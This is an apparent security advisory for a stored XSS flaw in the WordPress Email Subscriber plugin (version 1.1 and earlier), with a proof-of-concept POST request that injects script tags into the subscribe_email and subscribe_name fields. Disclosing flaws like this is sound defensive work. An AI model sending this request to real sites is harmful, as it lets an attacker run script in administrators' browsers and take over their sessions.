# Email Subscriber <= 1.1 - Unauthenticated Stored Cross-Site Scripting (XSS)
Description

The kento_email_subscriber_ajax AJAX action of the plugin, does not properly sanitise, validate and escape the submitted subscribe_email and subscribe_name POST parameters, inserting them in the DB and then outputting them back in the Subscriber list (/wp-admin/edit.php?post_type=kes_campaign&page=kento_email_subscriber_list_settings), leading a Stored XSS issue.

# Proof of Concept
```
POST /wp-admin/admin-ajax.php HTTP/1.1

Content-Length: 117

Accept: */*

X-Requested-With: XMLHttpRequest

Content-Type: application/x-www-form-urlencoded; charset=UTF-8

Accept-Language: en-US,en;q=0.9

Connection: close



action=kento_email_subscriber_ajax&subscribe_email=<script>alert(1)</script>&subscribe_name=<script>alert(1)</script>





Then view the Subscriber list (/wp-admin/edit.php?post_type=kes_campaign&page=kento_email_subscriber_list_settings) as admin to trigger the XSS
